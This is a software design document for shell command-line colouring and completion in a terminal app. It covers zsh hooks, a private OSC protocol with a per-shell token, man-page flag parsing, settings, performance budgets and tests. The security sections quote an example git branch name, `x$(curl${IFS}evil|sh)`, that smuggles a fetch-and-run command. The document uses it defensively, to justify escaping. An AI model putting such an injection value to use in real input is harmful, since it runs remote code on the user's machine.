# Completion and highlighting at the prompt

Status: **reviewed** by Opus (xhigh), findings folded in (§16). Alex's
decisions of 31 Oct 2026 are in §1.

## Goal and done-when

While you type a command line at the shell's prompt, decline:

1. colours it: the command, its flags, strings, variables, pipes and
   redirects, a command or folder that doesn't exist;
2. opens a list under the cursor, after a short pause in typing, of what
   the word being typed could be: files and folders, commands (on PATH,
   aliases, functions, builtins), and a command's flags and subcommands
   with what each does, from its man page;
3. on Tab with nothing of its own to offer, asks zsh's own completion
   (git branches, ssh hosts, make targets…) and shows its answers in the
   same list.

Done when: all three work in zsh started by the app; each can be turned
off on its own in Settings (§10); every budget in §11 is met and
measured (nothing when off or unused, typing latency unchanged when on);
and the list and colours are tested as below (§12). bash and fish get
1 and 2 from the screen (§3.3), without Tab-to-zsh.

## 1. Decisions (Alex, 31 Oct 2026)

| Question | Decision |
|---|---|
| Where suggestions come from | Both: decline itself for files, commands and flags as you type; Tab asks zsh for the rest |
| When the list opens | By itself, after a short pause in typing; Up/Down move in it while it's open, Esc closes it, Tab takes the choice, Enter still runs the line |
| What the list looks like | Drawn by the renderer in the terminal's font and theme colours (not AppKit) |
| `--help` | Man pages only; a menu item reads one program's `--help` when you ask |
| Grey text after the cursor | Kept: the top choice shows grey after the cursor, Right arrow at the end of the line takes it |
| History order | Yes: commands ordered by how often they appear in the shell's history file |
| On by default | On for everyone (every setting in §10 defaults to true) |
| Enter with the list open | Always runs the line as typed, even after moving in the list |

The find bar stays the only AppKit UI of our own; the list is drawn like
the cursor and the selection, so it costs no view, layer or backing
store.

## 2. What it looks like

Colours (theme ANSI slots, so every theme works; §5):

```
~/src ❯ git commt -m "fix it" | grep -v $HOME > ./out.txt
        ─── ───── ── ──────── ─ ──── ── ───── ─ ─────────
        │   │     │  │        │ │    │  │     │ └ path (exists: plain; missing folder: red)
        │   │     │  │        │ │    │  │     └ redirect: magenta
        │   │     │  │        │ │    │  └ variable: cyan
        │   │     │  │        │ │    └ flag: blue
        │   │     │  │        │ └ command found: green
        │   │     │  │        └ pipe: magenta (next word is a command)
        │   │     │  └ string: yellow
        │   │     └ flag: blue
        │   └ subcommand: plain (never red, §4)
        └ command found: green (not found: red)
```

The list, below the cursor's row (above it when there aren't enough
rows below), over the cells, never resizing the program:

```
~/src ❯ ls -l▏
          ┌──────────────────────────────────────────────┐
          │▸-l   List in long format                     │
          │ -la  combined: -l -a                         │
          │ -lh  combined: -l -h                         │
          ├──────────────────────────────────────────────┤
          │ -l  List files in the long format, as        │
          │     described in The Long Format below.      │
          │                                 — ls(1)      │
          └──────────────────────────────────────────────┘
```

Commands, with the man page's one-line description (its NAME section,
as `whatis` shows it), and the top choice shown grey after the cursor:

```
~ ❯ carg▏o
      ┌──────────────────────────────────────────┐
      │▸cargo          Rust's package manager    │
      │ cargo-clippy   Checks a package for lint │
      │ cargo-fmt      Formats Rust code         │
      └──────────────────────────────────────────┘
```

Files and folders, folders first, with the size of a file:

```
~/src/terminal-decline ❯ cat crates/term-c▏
                                   ┌────────────────────────┐
                                   │▸term-core/      folder │
                                   │ term-cli/       folder │
                                   └────────────────────────┘
```

At most 8 rows of choices, scrolling; the detail pane shows only for
flags with more description than fits on their row.

## 3. Knowing the command line

### 3.1 zsh reports it

`shell/decline.zsh` adds a `zle-line-pre-redraw` hook with
`add-zle-hook-widget` (zsh 5.3+; it chains with zsh-syntax-highlighting
and Oh My Zsh's own hooks). On each redraw it sends:

```
ESC ] 7701 ; line ; <token> ; <keymap> ; <cursor> ; <line> BEL
```

- **Only for the first line of a command**: while `$CONTEXT` is `start`
  and `$PREBUFFER` is empty. In a continuation line (`for …; do` then
  Enter, PS2 has no B mark) or `vared` it sends an empty line, so old
  colours go.
- **Encoding**: zsh has no base64 builtin, and a process per keystroke
  is far over budget. `%`, `;` and the bytes 0x00–0x1F and 0x7F are
  percent-encoded in one expansion under `LC_ALL=C` (as `_decline_cwd`
  already does); term-core decodes with its `percent_decode`. vte drops
  C0 controls inside an OSC and stops splitting at 16 parameters, so
  neither raw NULs nor raw `;` can be sent.
- **`<cursor>`** is `${#LBUFFER}` under `LC_ALL=C`: bytes, the same units
  term-core decodes, so the two can't disagree about what a character is.
- **`<keymap>`** is `$KEYMAP` (`main`, `emacs`, `viins`, `vicmd`), for §9.
- Lines over 4 KB send an empty line with `long` in place of the
  keymap: no colours, no list.

Once per prompt (precmd), only when something changed since the last
one, it sends what the shell can run and where its history is:

```
ESC ] 7701 ; env ; <token> ; path=<$PATH> ; alias=… ; salias=… ; galias=… ; func=… ; builtin=… ; resword=… ; autocd=0|1 ; histfile=… BEL
```

Lists are newline-separated before encoding; `_*` completion functions
are left out. The shell sends the `$PATH` string, not the programs on
it: the app lists PATH itself (§6). Changes are found by comparing each
joined list with the last one sent, held in hidden shell variables.

7701 is unused by any terminal we know of (133 is FinalTerm's, 633 VS
Code's, 1337 iTerm2's) and doesn't clash with the app's own 7770 and
7771.

**Writing it**: the hook prints to the terminal directly. An OSC takes
no cells and zle keeps its own idea of the cursor, so zle's display is
unaffected (plugins that change the cursor shape in `zle-keymap-select`
do the same). It goes to a descriptor opened once on `$TTY` with
`zsh/system`'s `sysopen` (close-on-exec), not fd 1, so a widget that
redirects output can't swallow it. Never `zle -M`, which shows text.

**The token**: what it defends against is untrusted bytes reaching the
terminal: `cat`, `curl`, `git log`, output from an ssh session, or a
same-user program writing to the pane's `/dev/ttysNNN`. Without it any
of those could forge a command line and steer what Tab types (§9). It
can't defend against code running as the user, which can edit
`~/.zshrc` anyway, and needn't: reading another process's environment
isn't the risk (`ps -E` shows none for a same-user child here, and
DESIGN.md says the same). So:

- The app makes a new random 128-bit token per shell and passes it as
  `DECLINE_TOKEN`, with the features it was started with (§10) as
  `DECLINE_COMPLETION`. Only zsh started with the integration gets one:
  not bash or fish (they send no reports, §3.3), not agent-API headless
  sessions (their recorder keeps raw output, and replaying it in the
  same shell would carry a valid token; 7701 is also stripped from
  recordings), and none when both colours and the list are off.
- The top of `shell/zsh/.zshenv`, before the user's own `.zshenv`, does
  `builtin typeset -gH _decline_token=$DECLINE_TOKEN; builtin unset
  DECLINE_TOKEN`. So nothing the user's startup files start inherits it
  (ssh-agent and gpg-agent from Oh My Zsh plugins, `exec tmux`, daemons),
  and `-H` keeps it out of `set` and `typeset` listings.
- tmux and screen drop unknown OSCs, `script` starts a shell with no
  token, and the scrollback restore replays stored history blocks, not
  raw bytes, so none of them can replay a report.

### 3.2 term-core

term-core parses 7701 (no platform code, so it stays there), checks the
token and keeps the latest of each kind, handed over by the reader
thread through `Events` like the commands (`take_commands`):

```rust
pub fn set_report_token(&mut self, token: Option<[u8; 16]>);
pub struct LineReport { pub text: String, pub cursor: usize, pub keymap: Keymap, pub at: Point }
pub fn take_line(&mut self) -> Option<LineReport>;
pub fn take_shell_env(&mut self) -> Option<ShellEnv>;
pub fn take_matches(&mut self) -> Option<Matches>;   // §7
```

- A line report counts only while the prompt is waiting for input
  (`input_at` is set: after a B mark, until the C mark) and the primary
  screen is shown; otherwise it is dropped. `at` is that B mark's
  position, so a report always says which line it belongs to.
- Ctrl+C at the prompt and `zle reset-prompt` (Powerlevel10k's async
  updates) print PS1 again with new A and B marks: `at` moves with them,
  and a report from before the new B is dropped.
- The app colours, and keeps the list open, only while the cells from
  `at` read the same text as the report (zle shows a control character
  as `^X`, so that comparison expands controls the same way). This is
  checked when the frame's snapshot is taken, with the terminal locked,
  so a report that arrives before zle's redraw (below) shows nothing
  until the redraw does.
- The view applies `Events`' commands (a prompt, a command starting)
  before the line report.
- The 7701 arm doesn't call `touch()`, so a report alone leaves
  `Terminal::generation()` unchanged.

**Echo timing**: the hook runs before zle redraws, and its print is
written at once while zle's redraw is buffered, so the reader often
reads the report alone. Today any read sets the dirty flag and wakes
the view, and the view drops `awaiting_echo` on any wake-up and draws
at once (`session.rs`, `view.rs` `output_arrived`): the frame would
show nothing new and the real echo would wait for the next tick, up to
8.3 ms at 120 Hz, which is the delay the October latency fix removed.
So the reader compares `generation()` before and after each parse: when
it hasn't changed, the report still goes through `Events` but the
dirty flag isn't set, the view isn't woken and `awaiting_echo` keeps
waiting for the echo. A pipeline test and a latency run (§11) cover it.

### 3.3 Other shells: read the screen

bash and fish have no per-keystroke hook, so for them the line is read
from the screen: the text from the B mark to the cursor (wrapped rows
joined), with the cursor where the screen cursor is. Only the part
before the cursor is read and coloured, since completion needs only
that; what follows (fish's autosuggestion, a right prompt) is ignored.
The row logic is shared with Option-click by factoring an
`input_line()` out of `prompts::input_steps`.

- Which source, per prompt: reports if a valid report arrived since this
  prompt's B mark, otherwise the screen. zsh with a token never reads
  the screen: Powerlevel10k's instant prompt prints a cached prompt,
  marks included, before zle runs.
- With `shell_integration = false` and a snippet sourced by hand, the
  marks still arrive, so screen reading applies, under the same
  completion settings.
- Without marks (no snippet at all) there is nothing to read: no
  colours, no list.
- Tab asking zsh (§7) is zsh only.

### 3.4 Only on this Mac

term-core keeps OSC 7's host (`cwd_host()`; today it is thrown away).
Colours and every source are off unless an OSC 7 from this Mac arrived
since this prompt's A mark. The host is compared with the Mac's own
names: zsh sends `$HOST` (the full name), fish `prompt_hostname` (the
short one), bash `$HOSTNAME`. A remote shell that sources the snippet
therefore gets nothing, rather than this Mac's files, commands and man
pages.

## 4. Reading the line (term-app `complete::lex`, pure)

A small shell reader, not a parser: words, quotes (`'…'`, `"…"`, `$'…'`),
backslashes, `$VAR`/`${…}`/`$(…)` (kept as one word), operators
(`| || & && ; ;; > >> < 2> &>`), comments, and which words are in a
command position: first word, after an operator, after `VAR=x`
assignments, and after the precommand words `sudo`, `env` (with its
`X=y`), `time`, `nohup`, `exec`, `command`, `builtin`, `noglob`,
`nocorrect` and `-`. Its output is spans with a kind, plus what the
cursor is on:

```rust
enum At { Command { prefix }, Subcommand { cmd, prefix }, Flag { cmd, sub, prefix },
          Path { prefix, quote }, Variable { prefix }, Nothing }
```

`quote` is an open quote in the word (`"my f`), so a taken name is
quoted to match (§9). Anything it doesn't understand (here-docs,
`case`, unbalanced quotes across lines) gives `Nothing` and plain
colours, so it can't do worse than today. Lines over 4 KB aren't read.

**Red only when certain.** A command word is green when it is a
reserved word, alias (including global aliases), function, builtin, a
program on PATH, or a path to an executable (`./x`, `/usr/bin/x`); with
`autocd` set (Oh My Zsh sets it) a folder is green too. It is red only
when none of those can be true after every check came back. A
subcommand is never red: git aliases and `git-*` / `cargo-*` programs
without a man page (git-lfs, cargo-nextest) are valid; a known one is
plain, an unknown one plain.

## 5. Colouring (term-render)

Colouring changes how cells are drawn, not the cells: the terminal's
grid, scrollback and copy are untouched, and the shell's redraws can't
fight it.

- Done at draw time in `assemble`, the way the block cursor already
  recolours cached glyphs by column: the row's glyphs are copied, those
  in a coloured span repainted, and the row marked not clean. The row
  cache and its keys are untouched, so a row never stays coloured after
  the colours go, and the snapshot needn't copy cells for cached rows.
  `build_live` does the same, so the tests comparing the two pictures
  hold.
- Spans come in view rows and columns, as a new highlight kind in the
  snapshot (which the app already edits for the selection and search),
  not buffer `Point`s.
- Colours are ANSI slots (green 2, red 1, yellow 3, blue 4, magenta 5,
  cyan 6) painted with `theme.paint`, so themes and theme transitions
  apply. (`keep_legible` only adjusts the selection and cursor, so it
  doesn't apply here.)
- Only cells in the default foreground with no attributes are
  recoloured. The colour tag can't tell that once a program sets OSC 10,
  so `build_row` sets a new `PLAIN` bit in the glyph flags (bits 3–7
  are free). A prompt theme, zsh-syntax-highlighting or
  zsh-autosuggestions' grey text keep their own colours, so nothing
  needs turning off for them.
- A ligature takes its first cell's colour.
- Paths and commands are checked off the main thread (§6); until a check
  comes back a word is plain, never red.

## 6. Where suggestions come from (term-app `complete::sources`)

All of it runs on one worker thread for the whole process, never on
the main thread or the PTY reader. Each source answers for a prefix and
is cached; the list shows whatever has answered when the pause ends and
fills in as the rest arrive.

Matching is by prefix: case-sensitive matches first, then
case-insensitive ones. No fuzzy matching in the first version.

- **Files and folders**: `read_dir` of the folder the word points into,
  relative to the shell's folder (OSC 7). Cached by folder until its
  mtime changes. Hidden files only for a prefix starting with `.`. Sizes
  need a `stat` per entry, so only the rows shown are stat'ed.
- **Commands**: the shell's PATH, aliases, functions, builtins and
  reserved words from the `env` report (§3.1); without one (bash, fish)
  the app's own PATH. Executables are listed once per PATH and refreshed
  when a PATH folder's mtime changes. Descriptions are the man pages'
  NAME lines, read only for the rows shown (there is no whatis database
  on macOS).
- **Flags and subcommands**: from the command's man page. The search
  path is built the way `manpath` does, from the shell's PATH and
  `/etc/man.conf`, by running `manpath` once per PATH on the worker
  thread. On this Mac that includes `/opt/homebrew/share/man`,
  `/System/Cryptexes/App/usr/share/man` and three Xcode folders, which
  the `<binary>/../share/man` rule misses (`/usr/bin/git` is a stand-in
  for Xcode's). Pages are gunzipped with term-image's zlib and read
  directly. Two layouts cover what we have here:
  - mdoc (BSD, macOS's own): `.It Fl x Ar arg` items, description to the
    next `.It`;
  - man(7) (GNU, Homebrew, git's asciidoc): `.TP` or `.PP` followed by a
    line of bold flags (`\fB\-\-detach\fR`), description in the `.RS`
    block after it.
  Subcommands are the man pages named `<cmd>-<sub>` (202 `git-*`, the
  `cargo-*` ones) with their NAME lines. A parsed page is cached under
  `~/Library/Caches/<bundle id>/man/` keyed by path and mtime.
- **History order**: commands are ordered by how often they appear in
  the shell's history file, then A–Z; flags and files stay in their own
  order. The file is zsh's `HISTFILE` from the `env` report (the app
  can't know it otherwise; see 5e93e27), read at the first list open,
  not the first prompt, then from where it left off. zsh's format is
  read properly: `: <time>:<secs>;<cmd>` lines, commands continued over
  several lines, and its own escaping of non-ASCII bytes. bash and fish
  history (other formats) come later; until then their commands are
  A–Z.
- **`--help`, when asked** (§8).

Words and descriptions from any source have control characters
stripped before they are drawn.

## 7. Tab asks zsh

With the list closed or empty, Tab goes to zsh. The snippet binds Tab
to a widget that runs zsh's completion with `compadd` captured (the
method fzf-tab uses):

- zsh first inserts the common prefix of all matches, as users expect
  (`compstate[insert]=unambiguous`), and prints no listing of its own
  (`compstate[list]=''`).
- With one match zsh inserts it as usual. With several, the widget
  keeps each match with its original `compadd` arguments in a shell
  array and sends what is shown:
  ```
  ESC ] 7701 ; matches ; <token> ; <count> ; <shown> ; <encoded word/description list> BEL
  ```
  The shown strings are `compadd -d`'s where given (`kill <Tab>` shows
  process lines but inserts PIDs).
- At most 1,000 matches or 32 KB are sent (OSC strings over 64 KB are
  dropped whole). Above that the widget falls back to zsh's own listing,
  so `brew install <Tab>` still shows something.
- Taking one is §9's private key: zsh, not decline, inserts it, with
  its own quoting, prefixes and suffixes (`-P -S -p -s -i -I`), whole-word
  replacements (`-U`, from `_approximate` and `_expand`) and removable
  suffixes (`-q -r -R`). That matters for safety as well as
  correctness: a fetched git branch may be named `x$(curl${IFS}evil|sh)`
  (check-ref-format allows it), and only zsh's escaping makes it a
  word.

**Other plugins**: decline.zsh loads after the user's `.zshrc`, so
binding Tab there would override fzf-tab, fzf's `fzf-completion`,
zsh-autocomplete and Oh My Zsh's `expand-or-complete-with-dots`. So:

- It remembers the widget already on `^I` in each keymap (`main`,
  `emacs`, `viins`) and falls back to that one, not to
  `expand-or-complete`.
- It doesn't bind Tab at all when that widget is fzf-tab's or
  zsh-autocomplete's.
- At each precmd it checks again that Tab and `zle-line-pre-redraw`
  still lead to decline, as it already does for its precmd hook's place,
  since a plugin loaded later (zsh-vi-mode, `source ~/.zshrc`) can
  replace them.
- Without a token (another terminal, or started with the feature off)
  it binds nothing, so the snippet behaves the same elsewhere.

## 8. Reading `--help` on request

Edit > Read Flags from --help (and the list's right-click) runs the
command under the cursor as `cmd --help`, once:

- with the shell's PATH (from the `env` report), not launchd's;
- in a temporary empty folder, stdin `/dev/null`, stdout a pipe;
- with `PAGER`, `GIT_PAGER` and `MANPAGER` set to `cat`, `NO_COLOR=1`
  and `TERM=dumb`;
- killed after 2 s, its whole process group; output capped at 256 KB.

GNU-style lines (`-x, --long[=ARG]   description`) are read into the
same flag list and cached like a man page. Aliases and functions can't
be run this way, so the item is off for them. Never automatic: a script
that doesn't know `--help` would just run.

## 9. Keys and taking a choice

- The list opens after `completion_delay` ms with no key (default 150)
  when the cursor is on a word with choices, or right after `-` on a
  flag. It closes on Esc, a key that isn't text or one of its own, the
  cursor leaving the word, a C mark, or the window losing focus. After
  Esc it doesn't open again until the word changes.
- While it's open: Up/Down move, Tab takes the choice, Esc closes. Enter
  closes it and goes to the shell, so it runs what you typed. Typing
  goes to the shell as always and filters the list.
- Right arrow, at the end of the line, takes the grey text after the
  cursor.
- **vi mode** (from the report's keymap): in `vicmd` the list never
  opens, since letters there are commands, not text; in `viins` Esc
  closes the list and also goes to the shell, so vi users don't press
  it twice.
- **Input methods**: keys are only intercepted while nothing is being
  composed (`KeyModes::composing`).
- **kitty keyboard protocol**: the presses the list used are recorded,
  so their repeats and releases aren't sent to the program either.
- Oh My Zsh binds Up to history search by prefix, exactly what's lost
  while the list is open; docs/shell-integration.md says how to rebind
  the list's keys.

**Taking a choice**:
- **zsh with a token**: the app types a private key sequence, `ESC [
  7701 ~` followed by a payload ending in BEL, which decline.zsh binds
  to a widget that reads the payload with `read -k`. For zsh's own
  matches (§7) the payload is the match's number, and the widget runs
  completion again with a `compadd` stand-in that adds only that match
  with its original options (fzf-tab's second step). For decline's own
  files, commands and flags the payload is the word (percent-encoded)
  and the widget replaces the word in `LBUFFER` with it quoted by zsh
  (`${(q-)…}`, matching an open quote and keeping a typed `~` or `$VAR`
  prefix). This avoids typing keys, which breaks in three ways: in vi
  insert mode Backspace won't delete past where insert mode began, Oh
  My Zsh's `url-quote-magic` adds backslashes to typed text, and
  Backspaces would have to count multibyte characters.
- **bash and fish**: the app quotes the word itself (matching an open
  quote, keeping `~` and `$VAR` prefixes) and types Backspaces for the
  part that differs, then the rest, encoded through `keys::translate` /
  `committed_text` with the pane's modes (under kitty flag 8 Backspace
  is `CSI 127 u`; `prompts::arrows`' raw bytes would be wrong). Control
  characters are never typed.

## 10. Settings

Each part can be turned off by itself, in `config.toml` and in Settings
(Cmd+,), in a new **Completion** section (`Section::Completion`, so
`Section::ALL` and the preferences layout change).

| Key | Default | Range | Applies | Does |
|---|---|---|---|---|
| `highlight_command_line` | true | bool | live* | colours the command line (§5) |
| `completion` | true | bool | live* | the list (§9); off turns off everything below |
| `completion_files` | true | bool | live | files and folders in the list |
| `completion_commands` | true | bool | live | commands in the list |
| `completion_flags` | true | bool | live | flags and subcommands from man pages |
| `completion_tab_zsh` | true | bool | new windows | Tab asks zsh (§7); off leaves Tab to zsh as today |
| `completion_delay` | 150 | 0–2000 ms | live | pause before the list opens |
| `completion_rows` | 8 | 3–20 | live | choices shown before it scrolls |
| `completion_ghost_text` | true | bool | live | the top choice grey after the cursor |
| `completion_history_order` | true | bool | live | commands by how often you ran them |

\* The token, and with it the zsh hook and Tab widget, is fixed when the
shell starts (§3.1). Turning both colours and the list off gives new
shells no token, so they send nothing; shells already open keep sending
until they exit, and the app drops what they send after one match arm.
Turning them back on in a shell that started with both off gives only
screen reading (§3.3) until a new tab. `completion_tab_zsh` can't reach
a running shell's widget, so it is new windows only
(`new_windows(...)` in the schema; the tests
`new_windows_flags_match_the_reload` and the key list change with it).
`shell_integration = false` turns the zsh parts off, as it does the
marks.

**Keys**: `[keybind]` maps chord to action, and its actions today are
menu items whose chords are always swallowed. The list's keys are a new
kind of action that applies only while the list is open and otherwise
falls through to `keys::translate`: `"down" = "completion_next"`,
`"up" = "completion_previous"`, `"tab" = "completion_accept"`,
`"escape" = "completion_close"`, `"right" = "completion_accept_ghost"`.
Binding a chord to `"none"` leaves that key to the shell while the list
is open.

## 11. Cost and how it is measured

The rule: **off costs nothing, and on but unused costs nothing either**.
Only typing at a prompt pays, and it must not show in keypress-to-screen
latency.

What each state may cost:

| State | Allowed cost |
|---|---|
| Off (both settings) | none: no thread, no timer, no cache, no shell hook in new shells; binary size only |
| On, a program running (flood, `vim`, `cargo build`) | one branch per frame (no colour spans) and an OSC arm never hit; parse and frame benchmarks unchanged within noise |
| On, idle at a prompt | 0 wakeups and 0.0% CPU: no polling and no timer armed; the pause timer is a one-shot armed by a keystroke |
| On, typing | per keystroke on the main thread: read the line and colour it ≤ 20 µs for a 200-character line; latency p50 and p99 unchanged within noise (the report must not cost the echo a tick, §3.2) |
| List open | ≤ 50 µs added to a frame; sources answer off the main thread |
| zsh, per keystroke | the hook ≤ 50 µs, so the shell's own echo doesn't slow down |

Threads and memory:
- One worker thread for the process, started on first use, blocking on
  its channel while idle. It exits after 60 s unused, its caches with it:
  that is one wake-up, 60 s after the last use.
- Caches are bounded by size, not count (one folder may hold 10,000
  files): 200,000 names across folders, PATH lists and parsed man pages
  together, oldest dropped first. The man cache on disk is capped at
  20 MB, oldest first. History is read from its end, at most 10,000
  lines.
- Budgets: footprint unchanged with both settings off; ≤ 2 MB per
  process after a session of use with every cache warm; release binary
  ≤ +200 KB.

New benchmarks (criterion, in the PRs that add the code):
- `term-core` `parse`: a typing session with 7701 reports between the
  keystrokes' echoes, against the same input without them.
- `term-app` (new `benches/complete.rs`): `lex` on lines of 20, 200 and
  4,000 characters; ranking 3,000 commands against a prefix; the man
  readers on the `ls`, `openrsync` and `git-checkout` fixtures.
- `term-render` `frame`: a prompt row with colours and with none; the
  list open (8 rows, detail pane) and closed.

Scripts to add, since what exists doesn't cover a zsh prompt
(`scripts/latency/run.py` has only echo.py, flood and htop;
`scripts/pressure/run.py` starts `sh -c …`, which gets no integration):
- a latency run that starts zsh with the integration under a temporary
  `HOME` and `ZDOTDIR`, once with everything on and once with everything
  off, plus one with `completion_delay = 0` so frames with the list open
  are measured (the script's keys come 50–150 ms apart);
- a pressure run under that zsh; without it, the pressure run only
  checks the per-frame branch;
- an idle run at that zsh prompt reusing pressure's `idle_wakeups`
  helper: 0 wakeups;
- the hook timed over 1,000 redraws with `$EPOCHREALTIME` in a `zpty`
  loop (zprof's own overhead would blur a 50 µs budget).

Before and after, with `uptime` load noted (and a #perfwindow chirp):
the three criterion benches, the latency, pressure and idle runs, the
hook timing, and `/usr/bin/footprint -p <pid>` off, on and idle, and on
after use.

A PR that misses a budget doesn't land until it meets it or Alex agrees
to the number. The results go in §15 as each PR lands, and in DESIGN.md
at the end of the phase.

## 12. Tests

- Unit tables: `lex` (quotes, operators, command positions, precommand
  words, `VAR=x cmd`, broken input → `Nothing`); quoting of taken names
  (open quotes, `~`, `$VAR`); the 7701 parser, its decoding, the token
  check, and dropping reports outside the prompt or on the alternate
  screen (term-core); man readers on small handwritten mdoc and man(7)
  fixtures shaped like `ls.1`, `openrsync.1` and `git-checkout.1`.
- Pipeline test: a report read alone doesn't wake the view or end the
  wait for the echo (§3.2).
- Frame tests (term-render): recolouring only `PLAIN` cells, the same in
  `build` and `build_live`; the list hiding the glyphs under it
  (including wide characters and ligatures) and images; the list placed
  below, above, shifted left at the right edge, and on the bigger side
  with fewer rows when it fits neither; ghost text hidden when the row
  isn't blank or input-method text shows.
- zsh snippet, in `zpty`: the hook sends 7701 with the token and
  percent-encoded `;`, `%` and controls; nothing in a continuation line;
  the token gone from the environment of a program the shell starts;
  Tab falls back to the widget that was there before (fzf-tab untouched);
  taking a match with `$(…)` in it inserts it escaped.
- One smoke test (CI): type `ls -` in zsh, wait, check the dump's new
  `completion` field (as `FindDump` does for the find bar) shows the list
  with `-l`, Tab, check the line reads `ls -l`.
- Settings: each key in §10 off gives no colours / no entries of its
  kind (dump checks); both off gives no token in a new shell's
  environment; the schema lists every key with its live / new-windows
  flag (term-prefs' schema tests).
- Measurement: §11.

## 13. PRs

Each PR adds its settings to the schema and its benchmarks, and puts the
before-and-after numbers in its description.

1. core + shell: 7701 parsing, token, `take_line` / `take_shell_env`,
   OSC 7's host; zsh reports and the token moved into a hidden
   variable; the reader not waking on a report alone. Parse bench with
   reports; hook timing; latency at a zsh prompt.
2. app: `complete::lex` and `At`, with tables; `benches/complete.rs`.
3. render + app: colouring (§5), `highlight_command_line`. Frame bench,
   latency, pressure.
4. app + render: the list, keys and the private take key, files and
   commands sources, the Completion section in Settings. Frame bench
   with the list, latency, idle wakeups, footprint.
5. app: man page readers, flags and subcommands, cache. Reader bench,
   footprint with the cache warm, disk cap.
6. shell + app: Tab asks zsh (§7), `take_matches`.
7. app: Read Flags from --help (§8).
8. app: bash and fish from the screen (§3.3); docs/shell-integration.md.

## 14. Open questions for Alex

None: all answered on 31 Oct 2026 (§1).

## 15. Measurements

None yet: each PR adds its numbers here as it lands (machine, `uptime`
load, before and after).

## 16. Review (Opus, xhigh, 31 Oct 2026)

Checked against the code at b864437; all 18 findings folded in above.

| # | Severity | Finding | Where now |
|---|---|---|---|
| 1 | blocker | zsh's matches typed as plain text: wrong quoting and suffixes, and an injection path (a git branch named `x$(…)`) | §7, §9: zsh inserts through a private take key |
| 2 | major | a report read before zle's redraw woke the view and cost the echo a tick | §3.2 echo timing |
| 3 | major | zsh has no base64; vte drops controls in an OSC and splits at most 16 parameters | §3.1 encoding |
| 4 | major | reports not reliably valid between B and C (continuation lines, Ctrl+C, reset-prompt) | §3.1, §3.2 |
| 5 | major | skipping the row cache couldn't work; recolour at draw time like the block cursor | §5 |
| 6 | major | the list's background drawn under the row glyphs; widths, clipping, ghost text, dump | §2, §12, below |
| 7 | major | the token leaked to everything the startup files start; threat model unstated | §3.1 the token |
| 8 | major | binding Tab overrode fzf-tab and others; hooks replaced by later plugins | §7 other plugins |
| 9 | major | large match lists over 64 KB dropped silently | §7 |
| 10 | major | `[keybind]` swallows its chords; Ctrl+P/N; vi mode; kitty releases; key encoding | §9, §10 keys |
| 11 | major | "all live" untrue for what the shell fixes at start | §10 |
| 12 | major | screen reading off whenever fish shows a suggestion; which source when | §3.3 |
| 13 | minor | OSC 7's host thrown away, so ssh wasn't really off | §3.4 |
| 14 | minor | man pages not where `<binary>/../share/man` looks | §6 |
| 15 | minor | red for reserved words, global aliases, autocd, git aliases | §4 |
| 16 | minor | memory bounded by count, a thread per window, history read too early and its format | §6, §11 |
| 17 | minor | latency and pressure scripts have no zsh prompt run | §11 |
| 18 | minor | `take_matches`, `--help` environment, quoting open quotes, stats, matching rule | §3.2, §8, §9, §6 |

On finding 6, the list is drawn this way:
- `covered` (today one row, for the cursor) becomes a rectangle, and
  glyphs whose pixel extent overlaps it are hidden: wide characters,
  ligatures, italic overflow. Images are left out of it too, since they
  are drawn over the rects.
- Its text is measured with term-core's widths (clusters, mode 2027),
  not `unicode_width` per character as `draw_preedit` does.
- It stays inside the pane's columns: shifted left at the right edge;
  when it fits neither below nor above, on the bigger side with fewer
  rows.
- The grey text after the cursor shows only while the cells to the end
  of the row are blank (a right prompt or zsh-autosuggestions' text
  means they aren't), hides while input-method text shows, and under a
  block cursor takes the cursor's text colour.

Found fine: printing an OSC from a zle hook; `zle-line-pre-redraw` and
`add-zle-hook-widget` on zsh 5.3+; 7701 free; parsing in term-core and
handing over through `Events`; the token's size and turning it off with
the features; the per-keystroke and list budgets; man pages read only,
`--help` only on request.
